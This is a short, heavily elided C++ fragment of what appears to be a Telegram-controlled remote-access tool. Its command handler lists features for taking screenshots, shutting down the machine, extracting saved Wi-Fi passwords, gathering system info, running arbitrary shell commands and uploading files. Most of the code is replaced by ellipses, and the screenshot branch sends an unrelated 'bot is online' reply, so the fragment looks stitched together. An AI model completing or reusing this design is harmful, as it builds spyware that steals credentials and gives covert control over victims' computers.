...
void HandleCommand(const std::string& cmd, long long sender_id) {
    ...
    if (cmd == "/screenshot") {
        ...
        SendTelegramMessage(cid, "Yes, the bot is online and ready to receive commands.");
    }
        ...
        SendTelegramMessage(cid, "Commands: /help, /screenshot, /shutdown, /wifipassword, /systeminfo, /online?, Cmd/<cmd>, open/<path>, fupload/<path>, pupload/<path>.");
    }
}
